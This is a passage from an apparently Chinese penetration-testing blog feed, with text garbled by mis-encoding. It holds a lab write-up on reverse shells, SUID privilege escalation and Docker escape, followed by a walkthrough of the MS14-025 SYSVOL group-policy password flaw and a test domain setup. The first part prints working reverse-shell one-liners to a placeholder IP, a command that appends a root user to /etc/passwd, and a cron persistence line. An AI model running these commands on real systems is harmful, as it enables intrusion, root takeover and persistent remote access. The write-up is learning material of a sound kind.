<p>ä½¿ç”¨ python åå¼¹shell åˆ°å…¬ç½‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;å…¬ç½‘ip&quot;,ç›‘å¬çš„ç«¯å£));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-p&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä¿å­˜ä¸ºshll.sh ,ä¹‹åæ‰§è¡Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/6.png"></p>
<p>åˆ°è¿™é‡Œï¼Œåå¼¹æ¥çš„shellè¿˜æœ‰äº›é—®é¢˜ï¼š</p>
<ul>
<li><p>ä¸€äº›å‘½ä»¤å¦‚suå’Œsshï¼Œéœ€è¦ä¸€ä¸ªæ­£ç¡®çš„ç»ˆç«¯æ‰èƒ½è¿è¡Œ</p>
</li>
<li><p>é€šå¸¸ä¸æ˜¾ç¤ºSTDERR</p>
</li>
<li><p>æ— æ³•æ­£å¸¸ä½¿ç”¨vimç­‰æ–‡æœ¬ç¼–è¾‘å™¨</p>
</li>
<li><p>æ²¡æœ‰å®Œæˆæ ‡ç­¾</p>
</li>
<li><p>æ²¡æœ‰å‘ä¸Šç®­å¤´ä½¿ç”¨å†å²</p>
</li>
<li><p>æ²¡æœ‰jobcontrolç­‰</p>
<p>æ¥ä¸‹æ¥ä½¿ç”¨pythonè·å–å®Œå…¨äº¤äº’å¼shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ¥ä¸‹æ¥åœ¨å…¬ç½‘çš„æœºå™¨ä¸Šæ‰§è¡Œ</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty; pty.spawn([&#x27;/bin/bash&#x27;,&#x27;-p&#x27;])&quot;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯ç”¨pythonäº¤äº’å¼</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŠŠå®ƒä¸¢åˆ°åå°æŒ‚èµ·</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ctrl + z</span>   </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é‡ç½®<span class="built_in">stty</span>ï¼Œä¹Ÿå°±æ„å‘³ç€ä½ çœ‹ä¸åˆ°è¾“å…¥çš„å†…å®¹</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŠŠåå°æŒ‚èµ·çš„ç¨‹åºè°ƒå›å‰å° ï¼Œå‘½ä»¤ä¸æ˜¾ç¤º</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">fg</span></span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å®Œå…¨åˆ·æ–°ç»ˆç«¯å±å¹•</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">å›è½¦ ï¼Œå†å›è½¦ ä¸¤æ¬¡</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">reset</span>  </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ctrl + c</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ¥ä¸‹æ¥è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæ ¹æ®ç¬¬ä¸€æ­¥å¾—åˆ°çš„ç¯å¢ƒå˜é‡æ¥è®¾ç½®</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> SHELL=bash</span>   </span><br></pre></td></tr></table></figure>

<p>å®Œç¾äº†,ä½†æ˜¯åå¼¹çš„shellå¹¶ä¸æ˜¯root ç”¨æˆ·ï¼Œæ¥ä¸‹æ¥æ‰§è¡Œ</p>
<p>find suid -exec &#x2F;bin&#x2F;bash -p ;</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/9.png"></p>
</li>
</ul>
<h2 id="4-docker-é€ƒé€¸"><a href="#4-docker-é€ƒé€¸" class="headerlink" title="4. docker é€ƒé€¸"></a>4. docker é€ƒé€¸</h2><p>  ä½¿ç”¨ <code>ls -alh /.dockerenv </code> åˆ¤æ–­æœåŠ¡å™¨æ˜¯å¦ä¸ºdockerç¯å¢ƒ, édockerç¯å¢ƒæ˜¯æ²¡æœ‰çš„</p>
<p>  <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png"></p>
<p>è¿™æ˜¯æ²¡æœ‰dockerçš„</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/13.png"></p>
<p>æˆ–è€…ä½¿ç”¨<code>cat /proc/1/cgroup</code>  æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹çš„cgroupä¿¡æ¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/8.png"></p>
<p>è¿™æ˜¯æ²¡æœ‰çš„</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/14.png"></p>
<p><code>fdisk -l</code> æŸ¥çœ‹ç£ç›˜æ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/10.png"></p>
<p>æ–°å»ºä¸€ä¸ªç›®å½•, å°†&#x2F;dev&#x2F;vda1æŒ‚è½½è‡³æ–°å»ºçš„ç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir abc</span><br><span class="line">mount /dev/vda1 abc</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/11.png"></p>
<p>å……æ»¡æ³¢æŠ˜ï¼Œä¸æ‡‚ã€‚ã€‚ã€‚</p>
<p>æ¢ä¸ªæ–¹æ³•ï¼Œ</p>
<p>ä½¿ç”¨ &#x2F;etc&#x2F;passwd åˆ›å»ºrootç”¨æˆ·ï¼Œ</p>
<p>é¦–å…ˆï¼Œä½¿ç”¨perlè¯­è¨€ç”Ÿæˆå¸¦æœ‰ç›å€¼çš„å¯†ç ï¼š</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -le <span class="string">&#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œä¸‹é¢è¿™æ¡å‘½ä»¤ï¼ŒæˆåŠŸå°†testç”¨æˆ·çš„ä¿¡æ¯åŠ å…¥ &#x2F;etc&#x2F;passwd æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>

<p>su test åˆ‡æ¢è¿‡å»</p>
<p>å†æ‰§è¡Œ mount  &#x2F;dev&#x2F;vda1 abc</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/12.png"></p>
<p>ç°åœ¨èƒ½æŸ¥çœ‹å®¿ä¸»æœºæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥é€ƒé€¸åˆ°å®¿ä¸»æœº</p>
<p>é€šè¿‡å†™å…¥è®¡åˆ’ä»»åŠ¡åˆ°å®¿ä¸»æœº</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/å…¬ç½‘ip/ç«¯å£ 0&gt;&amp;1&#x27; &gt;&gt; abc/var/spool/cron/root</span><br></pre></td></tr></table></figure>

<p>å°†python åå¼¹çš„è„šæœ¬å†™è¿›å»ï¼ŒåŒæ ·gg</p>
<p>æœ€ç»ˆï¼Œç›´æ¥å°†åå¼¹shellçš„è„šæœ¬ï¼Œå†™å…¥å®¿ä¸»æœºçš„ç›®å½•ä¸‹ </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim abc/root/shell.sh </span><br></pre></td></tr></table></figure>

<p>ä¹‹åï¼Œèµ‹äºˆæƒé™ï¼Œç›´æ¥æ‰§è¡Œåå¼¹å›shell</p>
]]></content>
      <categories>
        <category>dockeré€ƒé€¸</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
        <tag>dockeré€ƒé€¸</tag>
      </tags>
  </entry>
  <entry>
    <title>ç»„ç­–ç•¥ææƒå®éªŒ</title>
    <url>/2021/01/16/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<blockquote>
<p>ç®¡ç†å‘˜åœ¨åŸŸä¸­æ–°å»ºä¸€ä¸ªç»„ç­–ç•¥å,æ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨åœ¨SYSVOå…±äº«ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ªXMLæ–‡ä»¶ï¼Œå³<code>Groups.xml</code>,è¯¥æ–‡ä»¶ä¸­ä¿å­˜äº†è¯¥ç»„ç­–ç•¥æ›´æ–°åçš„å¯†ç ã€‚</p>
</blockquote>
<h2 id="1-ç»„ç­–ç•¥åŸºæœ¬ä»‹ç»"><a href="#1-ç»„ç­–ç•¥åŸºæœ¬ä»‹ç»" class="headerlink" title="1. ç»„ç­–ç•¥åŸºæœ¬ä»‹ç»"></a>1. ç»„ç­–ç•¥åŸºæœ¬ä»‹ç»</h2><p>ç»„ç­–ç•¥å¯ä»¥æ§åˆ¶ç”¨æˆ·å¸æˆ·å’Œè®¡ç®—æœºå¸æˆ·çš„å·¥ä½œç¯å¢ƒã€‚å®ƒæä¾›äº†æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºå’Œæ´»åŠ¨ç›®å½•ä¸­ç”¨æˆ·è®¾ç½®çš„é›†ä¸­åŒ–ç®¡ç†å’Œé…ç½®ã€‚æœ‰æœ¬æœºç»„ç­–ç•¥å’ŒåŸŸçš„ç»„ç­–ç•¥ã€‚æœ¬æœºç»„ç­–ç•¥ç”¨äºè®¡ç®—æœºç®¡ç†å‘˜ç»Ÿä¸€ç®¡ç†æœ¬æœºä»¥åŠæ‰€æœ‰ç”¨æˆ·ï¼ŒåŸŸå†…çš„ç»„ç­–ç•¥ç”¨äºåŸŸç®¡ç»Ÿä¸€ç®¡ç†åŸŸå†…çš„æ‰€æœ‰è®¡ç®—æœºä»¥åŠåŸŸç”¨æˆ·ã€‚ åœ¨æœ¬æ–‡ä¸­ä¾§é‡ç‚¹è®²çš„æ˜¯åŸŸå†…çš„ç»„ç­–ç•¥ï¼Œå€Ÿæœºå­¦ä¸€ä¸‹åŸŸç¯å¢ƒæ­å»º</p>
<h2 id="2-SYSVOL-æ¼æ´-MS14-025"><a href="#2-SYSVOL-æ¼æ´-MS14-025" class="headerlink" title="2. SYSVOL æ¼æ´(MS14-025)"></a>2. SYSVOL æ¼æ´(MS14-025)</h2><p>SYSVOLæ˜¯æ´»åŠ¨ç›®å½•é‡Œé¢çš„ä¸€ä¸ªç”¨äºå­˜å‚¨åŸŸå…¬å…±æ–‡ä»¶æœåŠ¡å™¨å‰¯æœ¬çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œåœ¨åŸŸä¸­çš„æ‰€æœ‰åŸŸæ§åˆ¶å™¨ä¹‹é—´è¿›è¡Œå¤åˆ¶ã€‚SYSVOL æ–‡ä»¶å¤¹æ˜¯åœ¨å®‰è£…æ´»åŠ¨ç›®å½•æ—¶è‡ªåŠ¨åˆ›å»ºçš„ï¼Œä¸»è¦ç”¨æ¥å­˜æ”¾ç™»å½•è„šæœ¬ã€ç»„ç­–ç•¥æ•°æ®åŠå…¶ä»–åŸŸæ§åˆ¶å™¨éœ€è¦çš„åŸŸä¿¡æ¯ç­‰ã€‚SYSVOL åœ¨æ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·æˆ–è€…åŸŸä¿¡ä»»ç”¨æˆ·å…·æœ‰è¯»æƒé™çš„æ´»åŠ¨ç›®å½•çš„åŸŸèŒƒå›´å†…å…±äº«ã€‚æ•´ä¸ªSYSvOL ç›®å½•åœ¨æ‰€æœ‰çš„åŸŸæ§åˆ¶å™¨ä¸­æ˜¯è‡ªåŠ¨åŒæ­¥å’Œå…±äº«çš„ï¼Œæ‰€æœ‰çš„åŸŸç­–ç•¥å‡å­˜æ”¾åœ¨C:\Windows\SYSVOL\DOMAIN\Policies ç›®å½•ä¸­ã€‚</p>
<p>åœ¨ä¸€èˆ¬çš„åŸŸç¯å¢ƒä¸­,æ‰€æœ‰æœºå™¨éƒ½æ˜¯è„šæœ¬åŒ–æ‰¹é‡éƒ¨ç½²çš„,æ•°æ®é‡é€šå¸¸å¾ˆå¤§ã€‚ä¸ºäº†æ–¹ä¾¿åœ°å¯¹æ‰€æœ‰çš„æœºå™¨è¿›è¡Œæ“ä½œ,ç½‘ç»œç®¡ç†å‘˜å¾€å¾€ä¼šä½¿ç”¨åŸŸç­–ç•¥è¿›è¡Œç»Ÿä¸€çš„é…ç½®å’Œç®¡ç†ã€‚å¤§å¤šæ•°ç»„ç»‡åœ¨åˆ›å»ºåŸŸç¯å¢ƒåï¼Œä¼šè¦æ±‚åŠ äººåŸŸçš„è®¡ç®—æœºä½¿ç”¨åŸŸç”¨æˆ·å¯†ç è¿›è¡Œç™»å½•éªŒè¯ã€‚ä¸ºäº†ä¿è¯æœ¬åœ°ç®¡ç†å‘˜å¯†ç çš„å®‰å…¨æ€§ï¼Œè¿™äº›ç»„ç»‡çš„ç½‘ç»œç®¡ç†å‘˜å¾€å¾€ä¼šä¿®æ”¹æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚ä½†æ˜¯å½“é€šè¿‡ç»„ç­–ç•¥ç»Ÿä¸€ä¿®æ”¹å¯†ç ï¼Œè™½ç„¶å¯†ç å¼ºåº¦ä¼šæœ‰æ‰€æé«˜ï¼Œè¿™å°±é€ æˆäº†æ‰€æœ‰æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç æ˜¯ç›¸åŒçš„ã€‚æ”»å‡»è€…è·å¾—äº†ä¸€å°æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ,å°±ç›¸å½“äºè·å¾—äº†æ•´ä¸ªåŸŸä¸­æ‰€æœ‰æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚</p>
<p>åœ¨åŸŸä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªé»˜è®¤çš„å…±äº«è·¯å¾„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure>

<p>æ‰€æœ‰åŸŸå†…ä¸»æœºéƒ½èƒ½è®¿é—®ï¼Œé‡Œé¢ä¿å­˜ç»„ç­–ç•¥ç›¸å…³æ•°æ®ï¼ŒåŒ…å«ç™»å½•è„šæœ¬é…ç½®æ–‡ä»¶ç­‰ã€‚</p>
<p>ä¾‹å¦‚ï¼Œæµ‹è¯•ä¸»æœºæ‰€åœ¨åŸŸä¸ºtest.yhyï¼Œå¯è®¿é—®å…±äº«æ–‡ä»¶å¤¹<code>\\test.yhy\SYSVOL\test.yhy</code>ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084350.png" alt="image-20210116111851931"></p>
<p>åœ¨æ—©æœŸçš„ç‰ˆæœ¬ï¼ŒæŸäº›ç»„ç­–ç•¥é¦–é€‰é¡¹å¯ä»¥å­˜å‚¨åŠ å¯†è¿‡çš„å¯†ç ï¼ŒåŠ å¯†æ–¹å¼ä¸ºAES 256ï¼Œè™½ç„¶ç›®å‰AES 256å¾ˆéš¾è¢«æ”»ç ´ï¼Œä½†æ˜¯å¾®è½¯é€‰æ‹©å…¬å¼€äº†ç§é’¥ï¼Œåœ°å€ï¼š <a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx%E3%80%82">https://msdn.microsoft.com/en-us/library/cc422924.aspxã€‚</a></p>
<p>![image-20210116111342068](&#x2F;Users&#x2F;yhy&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210116111342068.png)</p>
<p>å¦‚ä¸‹å‡ ä¸ªç»„ç­–ç•¥é¦–é€‰é¡¹æ–‡ä»¶ä¸­ä¼šå­˜åœ¨å¯é€‰çš„å¯†ç cpassword å±æ€§:</p>
<ul>
<li><p>Groups\Groupsx.xml</p>
</li>
<li><p>Services\Services.xml</p>
</li>
<li><p>ScheduledTasks\ScheduledTasks.xml</p>
</li>
<li><p>Printers\Printers.xml</p>
</li>
<li><p>Drives\Drives.xml</p>
</li>
<li><p>DataSources\DataSources.xml</p>
</li>
</ul>
<h2 id="3-æ¼æ´å¤ç°"><a href="#3-æ¼æ´å¤ç°" class="headerlink" title="3. æ¼æ´å¤ç°"></a>3. æ¼æ´å¤ç°</h2><h3 id="3-1-åŸŸç¯å¢ƒæ­å»º"><a href="#3-1-åŸŸç¯å¢ƒæ­å»º" class="headerlink" title="3.1 åŸŸç¯å¢ƒæ­å»º"></a>3.1 åŸŸç¯å¢ƒæ­å»º</h3><h4 id="3-1-1-ç¯å¢ƒè¦æ±‚"><a href="#3-1-1-ç¯å¢ƒè¦æ±‚" class="headerlink" title="3.1.1 ç¯å¢ƒè¦æ±‚"></a>3.1.1 ç¯å¢ƒè¦æ±‚</h4><p>ç¯å¢ƒï¼šWindows Server 2008R2 </p>
<p>ç½‘ç»œï¼šNATæ¨¡å¼</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084407.png" alt="image-20210116112955314"></p>
<p>æ›´æ”¹ç®¡ç†å‘˜Administrator å¯†ç ä¸ºå¼ºå¯†ç ï¼Œä¾‹å¦‚ï¼štest.yhy@123</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084412.png" alt="image-20210116114025566"></p>
<h4 id="3-1-2-æ·»åŠ åŸŸ"><a href="#3-1-2-æ·»åŠ åŸŸ" class="headerlink" title="3.1.2 æ·»åŠ åŸŸ"></a>3.1.2 æ·»åŠ åŸŸ</h4><p>ç‚¹å‡»å·¦ä¸‹è§’å¼€å§‹æŒ‰é’®æ—è¾¹çš„æœåŠ¡å™¨ç®¡ç†å™¨ï¼Œè§’è‰² â€”&gt; æ·»åŠ è§’è‰²</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084418.png" alt="image-20210116112445745"></p>
<p>é€‰ä¸­ Active Directory åŸŸæœåŠ¡</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084422.png" alt="image-20210116113323735"></p>
<p>ä¸€ç›´ä¸‹ä¸€æ­¥ï¼Œå®‰è£…å³å¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084429.png" alt="image-20210116113443897"></p>
<p>å…³é—­åï¼Œæ‰“å¼€â€œæœåŠ¡å™¨ç®¡ç†å™¨â€ï¼Œæ‰¾åˆ°Active Directoryå®‰è£…å‘å¯¼</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084433.png" alt="image-20210116113523528"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084437.png" alt="image-20210116113639168"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084446.png" alt="image-20210116114315069"></p>
<p>å› ä¸ºå‰é¢æ²¡é…ç½®é™æ€IPï¼ˆå‰é¢åº”è¯¥é…ç½®ä¸ºé™æ€IPçš„ï¼Œä¸è¿‡è¿™ä¸ªç¯å¢ƒæ— æ‰€è°“äº†ï¼‰ï¼Œè¿™é‡Œé€‰æ‹©æ˜¯ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084451.png" alt="image-20210116114528206"> </p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084518.png" alt="image-20210116114630800"></p>
<p>ç‚¹å‡»æ˜¯ï¼Œä¸‹ä¸€æ­¥ï¼Œè®¾ç½®å¯†ç ï¼štest.yhy@123</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084525.png" alt="image-20210116114714649"></p>
<p>ä¸€ç›´ä¸‹ä¸€æ­¥ï¼Œç­‰å¾…å®‰è£…</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084531.png" alt="image-20210116114816453"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084537.png" alt="image-20210116114855068"></p>
<p>å®Œæˆï¼Œé‡å¯ã€‚</p>
<p>æµ‹è¯•ä¸€ä¸‹ï¼š<code>net user /domain</code>, ok</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084547.png" alt="image-20210116115925975"></p>
<h4 id="3-1-3å®‰è£…FTPæœåŠ¡"><a href="#3-1-3å®‰è£…FTPæœåŠ¡" class="headerlink" title="3.1.3å®‰è£…FTPæœåŠ¡"></a>3.1.3å®‰è£…FTPæœåŠ¡</h4><p>è™šæ‹Ÿæœºä¸çŸ¥é“ä¸ºå•¥è£…ä¸ä¸ŠVMware Toolsï¼Œæ²¡åŠæ³•æ‹–æ–‡ä»¶ï¼Œè¿™é‡Œæ‰“å¼€FTPæœåŠ¡ï¼Œä½¿ç”¨FTPä¸Šä¼ æ–‡ä»¶ã€‚</p>
<p>è¿˜æ˜¯ç‚¹å‡»å·¦ä¸‹è§’å¼€å§‹æŒ‰é’®æ—è¾¹çš„æœåŠ¡å™¨ç®¡ç†å™¨ï¼Œè§’è‰² â€”&gt; æ·»åŠ è§’è‰²</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084554.png" alt="image-20210116120244713"></p>
<p>é€‰æ‹©WebæœåŠ¡ï¼ˆIISï¼‰ï¼Œä¸‹ä¸€æ­¥ï¼Œæœ€ä¸‹è¾¹é€‰æ‹©FTPæœåŠ¡å™¨</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084558.png" alt="image-20210116120911584"></p>
<p>ä¸€ç›´ä¸‹ä¸€æ­¥ï¼Œå®‰è£…</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084604.png" alt="image-20210116120952490"></p>
<p>å®Œæˆåï¼Œç‚¹å‡»å¼€å§‹æŒ‰é’®ï¼Œæ‰€æœ‰ç¨‹åº â€”&gt; ç®¡ç†å·¥å…· â€”&gt; Internet ä¿¡æ¯æœåŠ¡(IIS)ç®¡ç†å™¨</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084609.png" alt="image-20210116120424350"></p>
<p>å³é”®æ·»åŠ FTPç«™ç‚¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084618.png" alt="image-20210116122419671"></p>
<p>ç«™ç‚¹åç§°éšæ„ï¼Œç‰©ç†è·¯å¾„ï¼Œè¿™é‡Œé€‰æ‹©äº†Cç›˜ä¸‹æ–°å»ºæ–‡ä»¶å¤¹ï¼Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084624.png" alt="image-20210116123005662"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084629.png" alt="image-20210116123140690"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084634.png" alt="image-20210116123215490"></p>
<p>ç„¶åå®Œæˆå³å¯ï¼Œ è¿™æ—¶å€™ä½¿ç”¨FTPè¿æ¥å·¥å…·å³å¯ï¼Œè¿ä¸ä¸Šé€šè¿‡æ§åˆ¶é¢æ¿ï¼Œå…³é—­é˜²ç«å¢™å³å¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084638.png" alt="image-20210116123531384"></p>
<h3 id="3-2-åˆ›å»ºç»„ç­–ç•¥ï¼Œæ‰¹é‡ä¿®æ”¹åŸŸä¸­æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç "><a href="#3-2-åˆ›å»ºç»„ç­–ç•¥ï¼Œæ‰¹é‡ä¿®æ”¹åŸŸä¸­æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç " class="headerlink" title="3.2 åˆ›å»ºç»„ç­–ç•¥ï¼Œæ‰¹é‡ä¿®æ”¹åŸŸä¸­æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç "></a>3.2 åˆ›å»ºç»„ç­–ç•¥ï¼Œæ‰¹é‡ä¿®æ”¹åŸŸä¸­æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç </h3><h4 id="3-2-1åˆ›å»ºç»„ç­–ç•¥"><a href="#3-2-1åˆ›å»ºç»„ç­–ç•¥" class="headerlink" title="3.2.1åˆ›å»ºç»„ç­–ç•¥"></a>3.2.1åˆ›å»ºç»„ç­–ç•¥</h4><p>Win + R æ‰“å¼€è¿è¡Œ ï¼Œè¾“å…¥gpmc.msc ï¼Œè¿›å…¥ç»„ç­–ç•¥ç®¡ç†ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084644.png" alt="image-20210116124142601"> 		å³å‡»<code>ç»„ç­–ç•¥</code> â€”&gt; <code>æ–°å»º</code>:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084649.png" alt="image-20210116124834370"></p>
<p>å³å‡»<code>test</code>(åˆšåˆšåˆ›å»ºå¥½çš„ç»„ç­–ç•¥å¯¹è±¡)â€“&gt;<code>ç¼–è¾‘</code>,æ¥åˆ°å¦‚ä¸‹ä½ç½®ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084653.png" alt="image-20210116124949983"></p>
<p>å³å‡»<code>æœ¬åœ°ç”¨æˆ·å’Œç»„</code>â€“&gt;<code>æ–°å»º</code>â€“&gt;<code>æœ¬åœ°ç”¨æˆ·</code>ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084658.png" alt="image-20210116125418016"></p>
<p>å…¶ä¸­è®¾ç½®çš„å¯†ç ä¸º<code>hackyhy.123</code></p>
<p>å›åˆ°ç»„ç­–ç•¥ç®¡ç†ï¼Œè®¾ç½®ç»„ç­–ç•¥çš„å¯¹è±¡ï¼Œæ·»åŠ <code>Domain Computers</code>åˆ°ç»„ç­–ç•¥ç»„ä¸­ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084712.png" alt="image-20210116125705664"></p>
